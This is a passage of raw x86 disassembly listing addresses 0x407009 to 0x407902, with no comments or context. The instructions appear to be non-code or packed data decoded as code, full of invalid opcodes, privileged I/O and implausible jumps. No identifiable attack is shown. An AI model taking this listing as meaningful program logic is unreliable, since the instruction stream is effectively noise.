  407009:	pop    es
  40700a:	jnp    0x407070
  40700c:	jne    0x40700d
  40700e:	shl    DWORD PTR fs:[eax],cl
  407011:	call   esi
  407013:	je     0x407080
  407015:	call   DWORD PTR [esi+0x58]
  407018:	je     0x407084
  40701a:	outs   dx,DWORD PTR ds:[esi]
  40701b:	aas    
  40701c:	out    dx,al
  40701d:	pop    es
  40701e:	cmp    esi,DWORD PTR [edx-0x4fc3008a]
  407024:	out    dx,al
  407025:	sti    
  407026:	xor    al,0x32
  407028:	or     al,0xe8
  40702a:	mov    ah,0xa8
  40702c:	je     0x40702d
  40702e:	sbb    bl,BYTE PTR [ebx-0xc480001]
  407034:	adc    WORD PTR [esi-0x7f8bfc98],0x4
  40703c:	push   cs
  40703d:	xor    esp,DWORD PTR [edx+0x6f75745c]
  407043:	xchg   esp,eax
  407044:	cmc    
  407045:	leave  
  407046:	hlt    
  407047:	not    edx
  407049:	arpl   WORD PTR [si+0x64],bx
  40704d:	mov    esi,0x7ede793
  407052:	retf   
  407053:	mov    ds:0xc4d4ff6b,al
  407058:	inc    edi
  407059:	(bad)  
  40705a:	int3   
  40705b:	mov    edi,0x26ea
	...
  40706c:	add    BYTE PTR [eax+0x36ff039d],dl
  407072:	pusha  
  407073:	imul   ebx,DWORD PTR [ebp-0x57],0x37
  407077:	je     0x4070c9
  407079:	cmp    ebx,DWORD PTR [ebp+0x3]
  40707c:	out    dx,eax
  40707d:	in     eax,0x5
  40707f:	mov    ecx,0x10fd1674
  407084:	call   0x47b9:0x6b166e8b
  40708b:	push   cs
  40708c:	je     0x407089
  40708e:	sub    bh,BYTE PTR [edx+0x746f7cc2]
  407094:	pop    es
  407095:	mov    esi,DWORD PTR [ecx]
  407097:	and    esi,DWORD PTR [esp+ebp*2-0x2b]
  40709b:	add    BYTE PTR [ecx],0x63
  40709e:	pop    esi
  40709f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070a0:	aam    0x5d
  4070a2:	clc    
  4070a3:	lock pop ebx
  4070a5:	fistp  DWORD PTR [ebp-0x2a]
  4070a8:	jae    0x4070e5
  4070aa:	jl     0x407053
  4070ac:	jae    0x4070f2
  4070ae:	cmp    al,0xab
  4070b0:	cld    
  4070b1:	cmp    al,0xd9
  4070b3:	jno    0x407115
  4070b5:	xor    al,0xf8
  4070b7:	in     al,0x5b
  4070b9:	sbb    bh,BYTE PTR [ebx]
  4070bb:	scas   al,BYTE PTR es:[edi]
  4070bc:	jae    0x407116
  4070be:	inc    ebp
  4070bf:	sbb    eax,0xd9fa8b0e
  4070c4:	les    edx,FWORD PTR [esi+edi*4]
  4070c7:	adc    dl,0x1a
  4070ca:	outs   dx,BYTE PTR ds:[esi]
  4070cb:	mov    ss,esp
  4070cd:	xchg   esp,eax
  4070ce:	outs   dx,BYTE PTR ds:[esi]
  4070cf:	cld    
  4070d0:	sti    
	...
  4070dd:	add    BYTE PTR [eax],al
  4070df:	add    BYTE PTR [ecx+eiz*8],al
  4070e2:	jge    0x407157
  4070e4:	hlt    
  4070e5:	pop    esp
  4070e6:	adc    eax,0xa06dec4a
  4070eb:	inc    esi
  4070ec:	pop    ebx
  4070ed:	add    eax,0x81cf7ebc
  4070f2:	and    eax,0x56054964
  4070f7:	stc    
  4070f8:	pop    esp
  4070f9:	outs   dx,BYTE PTR ds:[esi]
  4070fa:	aam    0xff
  4070fc:	lds    esi,FWORD PTR [edi]
  4070fe:	pushf  
  4070ff:	sbb    al,0x22
  407101:	add    eax,0x6dabdb51
  407106:	add    BYTE PTR [esi],dh
  407108:	cs enter 0xc3f3,0x60
  40710d:	outs   dx,BYTE PTR ds:[esi]
  40710e:	jne    0x40710d
  407110:	adc    eax,edi
  407112:	or     ebx,DWORD PTR [esi]
  407114:	pop    edx
  407115:	fsubr  DWORD PTR [eax]
  407117:	test   al,0x60
  407119:	pop    ebp
  40711a:	inc    ecx
  40711b:	and    BYTE PTR [eax],dl
  40711d:	outs   dx,BYTE PTR ds:[esi]
  40711e:	mov    DWORD PTR [esp+ecx*1+0x7bfdffdb],ebp
  407125:	adc    eax,0x6e6c7cff
  40712a:	xor    eax,0xffc44794
  40712f:	sar    BYTE PTR [ebp+0x3e],1
  407132:	(bad)  
  407133:	(bad)  
  407135:	ret    0x64f7
  407138:	sbb    esp,DWORD PTR [ebp+0x50]
  40713b:	into   
  40713c:	dec    ebx
  40713d:	adc    edi,edi
  40713f:	cmp    al,0x63
  407141:	ins    BYTE PTR es:[edi],dx
  407142:	xor    eax,0x14
	...
  407153:	push   esi
  407154:	(bad)  
  407155:	inc    eax
  407157:	push   ebp
  407158:	jmp    FWORD PTR ds:[esi+0x13efc2a7]
  40715f:	ins    BYTE PTR es:[di],dx
  407161:	jne    0x40712c
  407163:	xchg   ecx,eax
  407164:	repnz or edx,DWORD PTR [esi+0x2828d24b]
  40716b:	pop    edi
  40716c:	pop    ebp
  40716d:	std    
  40716e:	mov    cl,0x71
  407170:	ins    BYTE PTR es:[edi],dx
  407171:	mov    DWORD PTR [ebx+eax*4],esp
  407174:	jp     0x4071bb
  407176:	mov    DWORD PTR [eax],edx
  407178:	ins    BYTE PTR es:[edi],dx
  407179:	jne    0x407140
  40717b:	jno    0x40716f
  40717d:	or     esp,DWORD PTR [esi-0x65]
  407180:	shr    BYTE PTR [eax],cl
  407182:	test   al,0x60
  407184:	pop    ebp
  407185:	in     eax,0x21
  407187:	push   ecx
  407188:	ins    BYTE PTR es:[edi],dx
  407189:	mov    DWORD PTR [esp+edi*1+0x26007d88],esp
  407190:	or     BYTE PTR [edi],cl
  407192:	test   BYTE PTR [esi],cl
  407194:	or     BYTE PTR [eax],al
  407196:	add    BYTE PTR [ecx],bh
  407198:	jne    0x407191
  40719a:	add    BYTE PTR [ebp-0x75ff757c],al
  4071a0:	or     BYTE PTR [ebx+0xf086e7d],al
  4071a6:	test   dl,bh
  4071a8:	pop    es
  4071a9:	add    BYTE PTR [eax],al
  4071ab:	push   ebp
  4071ac:	ins    DWORD PTR es:[edi],dx
  4071ad:	daa    
  4071ae:	(bad)  
  4071af:	jmp    FWORD PTR [edi-0x19]
  4071b2:	sub    cl,BYTE PTR [eax-0x9]
  4071b5:	(bad)  
  4071b6:	inc    DWORD PTR [eax]
	...
  4071c4:	add    BYTE PTR [eax],al
  4071c6:	out    dx,eax
  4071c7:	(bad)  
  4071c9:	jne    0x40714d
  4071cb:	rol    BYTE PTR [eax-0x109ba3e],1
  4071d1:	jne    0x407215
  4071d3:	div    BYTE PTR [eax+ecx*1+0x22]
  4071d7:	outs   dx,DWORD PTR ds:[esi]
  4071d8:	sar    edi,0x15
  4071db:	div    BYTE PTR [esp+esi*8+0x25]
  4071df:	je     0x4071e8
  4071e1:	call   0x3f3577
  4071e6:	mov    ebx,0x3a13275c
  4071eb:	in     eax,0xbd
  4071ed:	jne    0x407206
  4071ef:	cmc    
  4071f0:	je     0x4071e2
  4071f2:	cmc    
  4071f3:	jae    0x4071fc
  4071f5:	call   0x3f3547
  4071fa:	loope  0x407202
  4071fc:	push   DWORD PTR [ebp-0x2e]
  4071ff:	cmc    
  407200:	je     0x4071f2
  407202:	jne    0x407278
  407204:	pop    es
  407205:	call   0x3f341b
  40720a:	jne    0x407280
  40720c:	jmp    0x40720d
  40720e:	mov    edi,0x883ce76f
  407213:	idiv   dh
  407215:	and    DWORD PTR [ebx+0x51],0x67
  407219:	add    BYTE PTR [edi+0x71],cl
  40721c:	test   BYTE PTR [ebp-0x3d],bh
  40721f:	pop    ecx
  407220:	test   BYTE PTR [esi],0xe8
  407223:	mov    al,ds:0x3373ff67
  407228:	test   DWORD PTR [edi],0x0
	...
  407236:	add    BYTE PTR [eax],al
  407238:	add    BYTE PTR [ebx-0x6300bce4],bh
  40723e:	push   ss
  40723f:	(bad)  
  407240:	imul   esp,DWORD PTR [ebx+0xb],0xc87b07f7
  407247:	inc    edx
  407248:	inc    DWORD PTR [edx+edi*8+0x398bf3f6]
  40724f:	inc    esi
  407250:	push   DWORD PTR [edx+ebp*2-0xa]
  407254:	sti    
  407255:	jnp    0x4072a8
  407257:	inc    esi
  407258:	jmp    DWORD PTR [edx+ebx*2-0xa]
  40725c:	test   DWORD PTR [ebx+0x69],0x4c54ff46
  407263:	imul   bh
  407265:	cmp    esp,DWORD PTR [ecx+0x46]
  407268:	inc    DWORD PTR [esp+edi*1-0xa]
  40726c:	jmp    0x4072b9
  40726e:	pop    ecx
  40726f:	inc    esi
  407270:	push   DWORD PTR [esp+ebp*4]
  407273:	mul    bl
  407275:	cmp    esi,DWORD PTR [ecx-0x59db00b9]
  40727b:	inc    ebp
  40727c:	and    al,0x63
  40727e:	sub    DWORD PTR [ebp-0x14],edi
  407281:	loop   0x407223
  407283:	jae    0x40727c
  407285:	or     al,0x94
  407287:	fist   DWORD PTR [edx]
  407289:	arpl   bx,bp
  40728b:	mov    al,0x68
  40728d:	ret    0xc2af
  407290:	(bad)  
  407291:	jl     0x407265
  407293:	xor    eax,DWORD PTR [ecx+0x63]
  407296:	add    al,0x93
  407298:	xor    esp,DWORD PTR [edx+0x86db5c]
	...
  4072aa:	add    BYTE PTR [eax],al
  4072ac:	nop
  4072ad:	add    eax,0x874b03a8
  4072b2:	sbb    al,bl
  4072b4:	int3   
  4072b5:	loop   0x40731b
  4072b7:	xor    al,0x22
  4072b9:	add    eax,0x6a68f64e
  4072be:	mov    esp,0x3edcbcfb
  4072c3:	jo     0x407271
  4072c5:	fstp   st(1)
  4072c7:	add    esi,DWORD PTR [ebx+ebp*4-0x3baf9a3f]
  4072ce:	call   0xa8772aae
  4072d3:	add    edi,ebx
  4072d5:	push   ebx
  4072d6:	fcmovb st,st(2)
  4072d8:	test   dl,ah
  4072da:	dec    edi
  4072db:	xor    al,0x22
  4072dd:	add    eax,0xc4309e91
  4072e2:	call   0xa8771ac2
  4072e7:	add    esp,DWORD PTR [eax+esi*8-0x24]
  4072eb:	jo     0x4072c3
  4072ed:	std    
  4072ee:	shr    BYTE PTR [ebx],1
  4072f0:	push   ebp
  4072f1:	push   0xffffffde
  4072f3:	fdiv   QWORD PTR [eax+0x5]
  4072f6:	(bad)  
  4072f7:	scas   al,BYTE PTR es:[edi]
  4072f8:	mov    ebx,0x3cc514c7
  4072fd:	loop   0x4072f6
  4072ff:	aaa    
  407300:	mov    ds:0x77245105,al
  407305:	(bad)  
  407306:	call   0x287699e6
  40730b:	add    al,0x8b
  40730d:	pop    eax
  40730e:	fcmovb st,st(4)
	...
  40731c:	add    BYTE PTR [eax],al
  40731e:	add    BYTE PTR [edx+eiz*8],dl
  407321:	in     eax,dx
  407322:	aaa    
  407323:	mov    ds:0x58f99605,al
  407328:	push   0x14
  40732a:	cld    
  40732b:	add    al,0xf8
  40732d:	xchg   BYTE PTR [edi-0xc],ch
  407330:	ja     0x407356
  407332:	jo     0x4072c7
  407334:	push   0x0
  407336:	cld    
  407337:	in     al,0x6a
  407339:	xor    eax,0xffc47e14
  40733e:	push   eax
  40733f:	adc    BYTE PTR [ebx-0x56361700],dl
  407345:	jne    0x40731a
  407347:	sbb    eax,0x60e9f7c0
  40734c:	add    eax,0x75aa2e00
  407351:	jmp    esi
  407353:	pusha  
  407354:	add    eax,0x698ae96a
  407359:	imul   ebp,ecx,0xac8c69ba
  40735f:	or     al,0xd5
  407361:	mov    WORD PTR [ebx+ecx*1+0x72],fs
  407365:	call   DWORD PTR [esi]
  407367:	scas   eax,DWORD PTR es:[edi]
  407368:	push   0x75
  40736a:	adc    DWORD PTR [eax+esi*8],ecx
  40736d:	sti    
  40736e:	adc    esi,esi
  407370:	xchg   edx,eax
  407371:	add    cl,ch
  407373:	imul   ebp,DWORD PTR [ecx-0x3af6148c],0xc67f2767
  40737d:	jmp    ebp
  40737f:	pop    ebx
  407380:	std    
  407381:	out    0x8e,eax
	...
  40738f:	add    BYTE PTR [eax],al
  407391:	add    BYTE PTR [ebp-0x4f9d0098],ah
  407397:	jp     0x40731e
  407399:	aad    0xb5
  40739b:	push   0x611119ff
  4073a0:	hlt    
  4073a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073a2:	mov    ebp,0xb06c8968
  4073a7:	jo     0x4073a8
  4073a9:	scas   al,BYTE PTR es:[edi]
  4073aa:	lea    esi,[edx+0x68859ef0]
  4073b0:	call   DWORD PTR [edi+ecx*1]
  4073b3:	popa   
  4073b4:	cmc    
  4073b5:	xchg   edi,eax
  4073b6:	jne    0x407420
  4073b8:	call   DWORD PTR [eax+esi*2+0x70]
  4073bc:	inc    DWORD PTR [eax]
  4073be:	(bad)  
  4073c0:	loope  0x407385
  4073c2:	ins    DWORD PTR es:[edi],dx
  4073c3:	xlat   BYTE PTR ds:[ebx]
  4073c4:	inc    BYTE PTR [ebp+0x72]
  4073c7:	retf   
  4073c8:	xchg   esp,eax
  4073c9:	call   edi
  4073cb:	fsub   st,st(7)
  4073cd:	das    
  4073ce:	push   esp
  4073cf:	add    al,0x0
  4073d1:	leave  
  4073d2:	js     0x407440
  4073d4:	call   DWORD PTR [ecx+eax*2-0x38]
  4073d8:	add    ah,0x2e
  4073db:	dec    esi
  4073dc:	jmp    FWORD PTR [ecx-0x3c]
  4073df:	xlat   BYTE PTR ds:[ebx]
  4073e0:	je     0x4073ea
  4073e2:	adc    ch,bh
  4073e4:	mov    edi,0x44e96dff
  4073e9:	cld    
  4073ea:	mov    ds:0x8a4132a9,al
  4073ef:	xlat   BYTE PTR ds:[ebx]
  4073f0:	je     0x4073fa
  4073f2:	jb     0x4073a3
  4073f4:	(bad)  
  4073f5:	inc    DWORD PTR [eax]
	...
  407403:	add    BYTE PTR [eax],al
  407405:	ins    DWORD PTR es:[edi],dx
  407406:	dec    esi
  407407:	jmp    DWORD PTR [edi-0x2c]
  40740a:	xor    eax,DWORD PTR [ecx+0x0]
  40740d:	shr    BYTE PTR [ecx-0x2885bece],cl
  407413:	xor    al,0x55
  407415:	mov    ds:0x9ae7ff41,eax
  40741a:	ret    0xfffe
  40741d:	push   ecx
  40741e:	les    esi,FWORD PTR [ebx+0xf]
  407421:	mov    dl,BYTE PTR [ecx-0x2]
  407424:	jne    0x407468
  407426:	int3   
  407427:	xchg   esp,eax
  407428:	cld    
  407429:	sub    eax,0x985e7da
  40742e:	(bad)  
  407430:	push   0x3a
  407432:	dec    esp
  407433:	(bad)  
  407434:	sub    BYTE PTR [ebx+0x1],bh
  407437:	push   0xff43195c
  40743c:	(bad)  
  40743d:	aaa    
  40743e:	dec    edi
  40743f:	sub    BYTE PTR [ecx-0x6],al
  407442:	retf   
  407443:	test   esi,eax
  407445:	arpl   WORD PTR [edi+0x12230b6d],cx
  40744b:	std    
  40744c:	dec    edi
  40744d:	xchg   ebx,eax
  40744e:	jg     0x407447
  407450:	pop    es
  407451:	sti    
  407452:	adc    dh,BYTE PTR [eax-0x1]
  407455:	in     al,0x85
  407457:	leave  
  407458:	ret    0xd6dc
  40745b:	fcos   
  40745d:	cmp    al,0x48
  40745f:	xor    BYTE PTR [ecx+0x63],al
  407462:	push   esi
  407463:	mov    edx,0xdb5e2232
  407468:	add    DWORD PTR [eax],eax
	...
  407476:	add    BYTE PTR [eax],al
  407478:	arpl   WORD PTR [esi-0x7d],bx
  40747b:	call   0xffad8c96
  407480:	pop    eax
  407481:	push   ds
  407482:	clc    
  407483:	push   cs
  407484:	adc    ecx,DWORD PTR [esi-0x39948a94]
  40748a:	sar    ebx,0x94
  40748d:	push   ds
  40748e:	pop    esp
  40748f:	xor    ah,BYTE PTR [eax+0x636a6d06]
  407495:	xchg   BYTE PTR [ebx],bh
  407497:	sub    BYTE PTR [edx],ah
  407499:	pop    esi
  40749a:	fistp  DWORD PTR [ebx+0x30]
  40749d:	popf   
  40749e:	add    ebp,DWORD PTR [eax+0x61]
  4074a1:	pop    esi
  4074a2:	add    eax,DWORD PTR [eax-0xba5685]
  4074a8:	pop    esp
  4074a9:	fs inc ebx
  4074ab:	je     0x407511
  4074ad:	sub    al,0xd4
  4074af:	(bad)  
  4074b0:	(bad)  
  4074b1:	je     0x40750e
  4074b3:	sbb    DWORD PTR [edi+0x50],eax
  4074b6:	ins    BYTE PTR es:[edi],dx
  4074b7:	call   0xffad1026
  4074bc:	leave  
  4074bd:	bound  ebp,QWORD PTR [ebp+esi*2+0x5b]
  4074c1:	push   esp
  4074c2:	jmp    0xd9f099c2
  4074c7:	and    bl,BYTE PTR [edx+esi*1]
  4074ca:	cld    
  4074cb:	out    0x93,eax
  4074cd:	add    eax,0xdc0c6ca5
  4074d2:	cld    
  4074d3:	ins    BYTE PTR es:[edi],dx
  4074d4:	mov    ?,ebp
  4074d6:	and    ch,0xf8
  4074d9:	data16 mov gs,WORD PTR [eax+eax*1+0x0]
	...
  4074ea:	add    BYTE PTR [esi+0x69],ch
  4074ed:	xchg   dh,dh
  4074ef:	fs pop ebp
  4074f1:	pop    ds
  4074f2:	inc    esp
  4074f3:	in     al,0x66
  4074f5:	mov    al,ds:0x14056741
  4074fa:	jns    0x4074c3
  4074fc:	sub    BYTE PTR ds:0xd2ce356f,0x3
  407503:	cmp    esi,edi
  407505:	push   ebp
  407506:	mul    BYTE PTR [ebp+ebx*2-0x17]
  40750a:	inc    ebx
  40750b:	mov    ah,0x66
  40750d:	jo     0x4074d5
  40750f:	test   al,0x7a
  407511:	hlt    
  407512:	fnstsw WORD PTR [esp+eax*8-0x18]
  407516:	js     0x407576
  407518:	repz add bl,al
  40751b:	xchg   esp,eax
  40751c:	out    0xe5,al
  40751e:	add    edx,DWORD PTR [edi]
  407520:	repnz nop
  407522:	rcl    BYTE PTR [eax-0x3c],1
  407525:	call   0x7400f9fe
  40752a:	add    esp,DWORD PTR [ebx-0x6]
  40752d:	sub    bh,dh
  40752f:	dec    ebp
  407530:	iret   
  407531:	adc    bl,bl
  407533:	cwde   
  407534:	data16 not dl
  407537:	les    eax,FWORD PTR ds:0xdd155ce9
  40753d:	push   ebp
  40753e:	xor    BYTE PTR [edx-0x3194c6fb],ah
  407544:	std    
  407545:	ror    dh,0x45
  407548:	data16 into 
  40754a:	pop    esp
  40754b:	fld    QWORD PTR [edx-0x3a]
  40754e:	imul   eax,DWORD PTR [eax],0x0
	...
  40755d:	add    BYTE PTR [ebx+0x24c4f4e4],bh
  407563:	iret   
  407564:	inc    eax
  407566:	jo     0x4074f8
  407568:	add    cl,ch
  40756a:	adc    eax,0x310674a6
  40756f:	pop    esi
  407570:	cmp    ch,BYTE PTR [ebp+0x1506678]
  407576:	addr16 add eax,0xd7174fef
  40757c:	xor    ebp,DWORD PTR [eax]
  40757e:	addr16 aad 0xfe
  407581:	hlt    
  407582:	call   0x48cea1e4
  407587:	callw  0x929c
  40758b:	call   WORD PTR [edx+0x66]
  40758f:	mov    edi,0xf05f1f7f
  407594:	stc    
  407595:	scas   eax,DWORD PTR es:[edi]
  407596:	inc    esp
  407597:	xor    al,al
  407599:	nop
  40759a:	dec    eax
  40759b:	inc    WORD PTR [esi+0x35]
  40759f:	xchg   edi,eax
  4075a0:	cmp    dh,ah
  4075a2:	mov    bl,0x78
  4075a4:	(bad)  
  4075a5:	mov    esp,0xe1756604
  4075aa:	cmp    BYTE PTR [ecx-0x3a07d941],dh
  4075b0:	pop    ebp
  4075b1:	xor    BYTE PTR ds:0xfdbc0001,bl
  4075b7:	pop    eax
  4075b8:	push   0xbe5660e9
  4075bd:	xchg   ecx,eax
  4075be:	xlat   BYTE PTR ds:[ebx]
  4075bf:	xor    BYTE PTR [ecx-0x17],al
	...
  4075ce:	add    BYTE PTR [eax],al
  4075d0:	add    cl,bh
  4075d2:	out    dx,eax
  4075d3:	or     esi,esi
  4075d5:	push   ebx
  4075d6:	or     eax,0x64c106e8
  4075db:	call   DWORD PTR [ecx+0x66]
  4075de:	add    eax,0x7b289fef
  4075e3:	xor    al,0x28
  4075e5:	addr16 fs jne 0x4075c6
  4075e9:	leave  
  4075ea:	fiadd  DWORD PTR [edi]
  4075ec:	add    BYTE PTR [edx],dl
  4075ee:	mov    ebx,0x21e5ffe5
  4075f3:	ret    0xa08
  4075f6:	ss mov ch,ah
  4075f9:	lds    edx,FWORD PTR [ebp+0xb]
  4075fc:	call   0x3f3d3a
  407601:	adc    ecx,ecx
  407603:	jae    0x40761f
  407605:	bound  esi,QWORD PTR [ebx+esi*1+0x41]
  407609:	or     bh,BYTE PTR [ecx]
  40760b:	out    0xd8,eax
  40760d:	mov    edi,0x4a50feef
  407612:	lock je 0x40761d
  407615:	loop   0x40759a
  407617:	(bad)  
  407618:	inc    DWORD PTR [ebp-0x40]
  40761b:	aad    0xc1
  40761d:	inc    ebp
  40761e:	out    dx,eax
  40761f:	enter  0xd2c2,0x8
  407623:	push   ebp
  407624:	mov    esp,DWORD PTR [esi]
  407626:	mov    eax,esp
  407628:	cld    
  407629:	mov    al,ds:0x25086a08
  40762e:	push   ebp
  40762f:	pop    es
  407630:	call   0x402457
	...
  407641:	add    BYTE PTR [eax],al
  407643:	add    BYTE PTR [ebx],al
  407645:	inc    ebp
  407646:	sti    
  407647:	push   0xffffff8a
  407649:	inc    eax
  40764a:	ins    DWORD PTR es:[edi],dx
  40764b:	xor    eax,0x9b6808bb
  407650:	scas   al,BYTE PTR es:[edi]
  407651:	dec    ecx
  407652:	(bad)  
  407653:	(bad)  
  407654:	lahf   
  407655:	xor    eax,0xc08a4128
  40765a:	mov    ebp,0xaef65c4
  40765f:	shr    dh,0x13
  407662:	push   eax
  407663:	push   0xbeef084b
  407668:	cli    
  407669:	out    dx,al
  40766a:	je     0x407674
  40766c:	xor    ch,BYTE PTR [edx+eiz*8-0x1]
  407670:	and    eax,0x63c18dc1
  407675:	cmp    ebp,DWORD PTR [ecx+0x6a]
  407678:	arpl   si,ax
  40767a:	fnstenv [edx+eiz*4]
  40767d:	outs   dx,BYTE PTR ds:[esi]
  40767e:	fstp   TBYTE PTR [edi-0xfbd291]
  407684:	push   esi
  407685:	add    DWORD PTR [ebx],ebx
  407687:	inc    ecx
  407688:	arpl   WORD PTR [esi+0x79],ax
  40768b:	les    ecx,FWORD PTR [ebx+ebp*4]
  40768e:	std    
  40768f:	mov    edi,0x67d35a8f
  407694:	bound  ebp,QWORD PTR [esi+0x58]
  407697:	mov    esi,0x7ef9393
  40769c:	sti    
  40769d:	sbb    esp,DWORD PTR [ebp-0x1]
  4076a0:	in     al,0x75
  4076a2:	leave  
  4076a3:	rcr    ah,0xda
  4076a6:	(bad)  
	...
  4076b4:	add    BYTE PTR [eax],al
  4076b6:	add    BYTE PTR [esp+esi*2],bh
  4076b9:	cs inc ecx
  4076bb:	arpl   WORD PTR [esi],si
  4076bd:	ins    DWORD PTR es:[edi],dx
  4076be:	xor    al,0x22
  4076c0:	outs   dx,BYTE PTR ds:[esi]
  4076c1:	push   0xc3051635
  4076c6:	(bad)  
  4076c7:	mov    esp,0xacff3f4d
  4076cc:	push   esi
  4076cd:	inc    ebx
  4076ce:	je     0x407724
  4076d0:	jle    0x4076a5
  4076d2:	(bad)  
  4076d3:	push   ss
  4076d4:	pop    bx
  4076d6:	or     dl,BYTE PTR [edx+esi*1+0x2d56e869]
  4076dd:	imul   edi,edi,0x7ddb6df9
  4076e3:	lods   eax,DWORD PTR ss:[esi]
  4076e5:	add    ebp,DWORD PTR [eax+0x41]
  4076e8:	cmp    edx,eax
  4076ea:	jmp    FWORD PTR [ebp-0x60]
  4076ed:	into   
  4076ee:	sub    BYTE PTR [edx],ah
  4076f0:	outs   dx,BYTE PTR ds:[esi]
  4076f1:	pop    ebx
  4076f2:	ss daa 
  4076f4:	pop    esp
  4076f5:	push   0xf7d9230b
  4076fa:	dec    edi
  4076fb:	mov    bl,0x5
  4076fd:	out    0xee,al
  4076ff:	pop    esp
  407700:	ins    DWORD PTR es:[edi],dx
  407701:	leave  
  407702:	imul   edi,DWORD PTR [ebx+eiz*2],0x6323fcc1
  407709:	into   
  40770a:	(bad)  [ebx+ebp*8]
  40770d:	ins    DWORD PTR es:[edi],dx
  40770e:	mov    cs:0x57c95105,al
  407714:	(bad)  
  407715:	call   0xfff8c582
  40771a:	ret    0x0
	...
  407729:	add    BYTE PTR [ebx+ebp*2],cl
  40772c:	cmc    
  40772d:	aas    
  40772e:	add    al,0x63
  407730:	repnz inc ebx
  407732:	ja     0x407746
  407734:	cmp    esp,edx
  407736:	cmc    
  407737:	fsub   st,st(0)
  407739:	pop    ebx
  40773a:	mov    ch,0x63
  40773c:	xchg   BYTE PTR [eax-0x5],ch
  40773f:	fs test eax,0xd4efdc68
  407745:	push   0x4b810d4e
  40774a:	int    0x62
  40774c:	data16 (bad) [edx+0x62]
  407750:	aam    0xfb
  407752:	les    edx,FWORD PTR [ebx+0x57]
  407755:	push   0x6909efb4
  40775a:	ss or  eax,0x62a53f51
  407760:	ds push 0xee366116
  407766:	pop    esp
  407767:	ins    DWORD PTR es:[edi],dx
  407768:	imul   DWORD PTR [ecx+0x4530628c]
  40776e:	pop    edi
  40776f:	add    eax,0x628f7cb4
  407774:	pushf  
  407775:	idiv   DWORD PTR [ebp+ebx*2+0x25]
  407779:	push   0xef290e6c
  40777e:	push   ss
  40777f:	in     eax,dx
  407780:	pusha  
  407781:	mov    cs:0xb8990005,al
  407787:	nop
  407788:	(bad)  
  407789:	out    dx,al
  40778a:	les    esi,FWORD PTR [ebp+0x394f]
	...
  40779c:	add    BYTE PTR [edi],ah
  40779e:	(bad)  
  40779f:	dec    esi
  4077a1:	add    eax,0x1e1c92ed
  4077a6:	bound  ecx,QWORD PTR [edi-0x32]
  4077a9:	xor    cl,BYTE PTR [edx]
  4077ab:	call   0xffa339ca
  4077b0:	and    DWORD PTR [edi],edi
  4077b2:	add    eax,0xecbdc600
  4077b7:	mov    eax,ds:0x4f6227f4
  4077bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077bd:	adc    cl,BYTE PTR [edx]
  4077bf:	call   0xffa2fba2
  4077c4:	xor    DWORD PTR [edi],edx
  4077c6:	add    al,0x0
  4077c8:	jle    0x40778f
  4077ca:	in     al,dx
  4077cb:	scas   eax,DWORD PTR es:[edi]
  4077cc:	mov    esp,0x7e4f621f
  4077d1:	ror    BYTE PTR [ecx],cl
  4077d3:	call   0xffa2bb9a
  4077d8:	sbb    DWORD PTR [ecx+eiz*4+0x478666ff],0x8e93e908
  4077e3:	in     al,dx
  4077e4:	push   0x23
  4077e6:	popa   
  4077e7:	push   0xffffffe9
  4077e9:	mov    cl,BYTE PTR [edi+edi*8]
  4077ec:	mov    esp,0x7c7969a8
  4077f1:	add    al,0x62
  4077f3:	mov    DWORD PTR [esp+edi*8-0x6dd1e612],ebp
  4077fa:	or     eax,ebp
  4077fc:	imul   edi,esp,0x93ff61
	...
  40780e:	add    BYTE PTR [eax],al
  407810:	inc    ecx
  407811:	bound  esi,QWORD PTR [ebp-0x1f]
  407814:	sbb    bl,bl
  407816:	dec    BYTE PTR [esi]
  407818:	add    al,0xef
  40781a:	sbb    eax,DWORD PTR [eax]
  40781c:	pop    ebp
  40781d:	push   esp
  40781e:	pop    es
  40781f:	call   0x3f6012
  407824:	dec    ebp
  407825:	push   esi
  407826:	sti    
  407827:	call   edi
  407829:	pop    esp
  40782a:	out    0x93,eax
  40782c:	jmp    edi
  40782e:	dec    cl
  407830:	or     BYTE PTR [ecx-0x1],ah
  407833:	push   esp
  407834:	sar    DWORD PTR [eax-0x415dff97],0x34
  40783b:	inc    ecx
  40783c:	cmp    bh,BYTE PTR ds:0x94b35da
  407842:	push   DWORD PTR ds:0x410277
  407848:	and    bl,BYTE PTR [eax-0x3e]
  40784b:	(bad)  
  40784c:	mov    ebp,0xf774bf5b
  407851:	xor    al,0xfe
  407853:	jne    0x40784f
  407855:	out    0x74,eax
  407857:	or     al,0x2a
  407859:	call   0x971280d2
  40785e:	in     al,0xff
  407860:	pop    ebp
  407861:	mov    esp,0xe74dbfdd
  407866:	imul   eax,DWORD PTR [eax],0x4134be62
  40786c:	mov    edx,0xb35da3c
  407871:	add    eax,0x268
	...
  407882:	add    dl,cl
  407884:	add    al,0x80
  407886:	call   0x3f3ea5
  40788b:	mov    cl,0xc4
  40788d:	jae    0x4078a4
  40788f:	cli    
  407890:	out    0x74,eax
  407892:	adc    BYTE PTR [ebp+0x55],cl
  407895:	or     edx,DWORD PTR [eax+0x3d]
  407898:	push   ebp
  407899:	pop    es
  40789a:	call   0x3f3898
  40789f:	push   edx
  4078a0:	ja     0x407861
  4078a2:	jmp    DWORD PTR [ebx-0x9]
  4078a5:	gs jne 0x4078fb
  4078a8:	(bad)  
  4078aa:	or     edi,ebx
  4078ac:	cld    
  4078ad:	das    
  4078ae:	inc    ecx
  4078af:	arpl   WORD PTR [edi-0x11],bx
  4078b2:	pop    es
  4078b3:	dec    ebx
  4078b4:	and    BYTE PTR [edi-0x1],bl
  4078b7:	dec    esp
  4078b8:	and    eax,0x21630c41
  4078bd:	jns    0x4078ab
  4078bf:	loopne 0x40786a
  4078c1:	push   0xf9c4636a
  4078c6:	(bad)  
  4078c7:	mov    dh,0x66
  4078c9:	pop    ebx
  4078ca:	mov    esi,0x896546e7
  4078cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078d0:	mov    ds:0x4714ffdc,al
  4078d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078d6:	push   0xffc258cf
  4078db:	add    eax,0x83e7fc01
  4078e0:	jg     0x407947
  4078e2:	dec    DWORD PTR [ebx+0xef036d]
	...
  4078f4:	add    BYTE PTR [eax],al
  4078f6:	lods   eax,DWORD PTR ds:[esi]
  4078f7:	add    eax,0x6ea2353d
  4078fc:	fs jne 0x40796a
  4078ff:	jbe    0x4078b7
  407901:	(bad)  
  407902:	aam    0xd6
